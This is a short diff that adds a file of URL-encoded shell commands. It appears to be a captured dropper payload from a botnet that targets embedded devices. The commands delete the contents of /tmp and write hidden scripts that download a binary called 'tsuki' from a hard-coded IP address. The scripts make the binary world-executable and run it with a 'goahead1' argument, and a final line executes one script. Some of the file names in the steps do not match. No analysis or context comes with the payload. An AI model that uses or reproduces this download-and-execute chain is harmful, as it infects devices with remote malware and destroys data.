@@ -1,0 +1,9 @@
+rm+-rf+/tmp/*
+echo+-e+"cd+/tmp"+>+/tmp/..arm7
+echo+-e+"wget+http:/\/95.214.27.3/tsuki"+>>+/tmp/.arm7
+echo+-e+"wget+http:/\/95.214.27.3/tsuki"+>>+/tmp/.arm
+echo+-e+"chmod+777+/tmp/tsuki"+>>+/tmp/.arm7
+echo+-e+"chmod+777+/tmp/tsuki"+>>+/tmp/.arm
+echo+-e+"/tmp/arm7+goahead1"+>>+/tmp/.arm7
+echo+-e+"/tmp/arm+goahead1"+>>+/tmp/.arm
+sh+/tmp/.arm7 
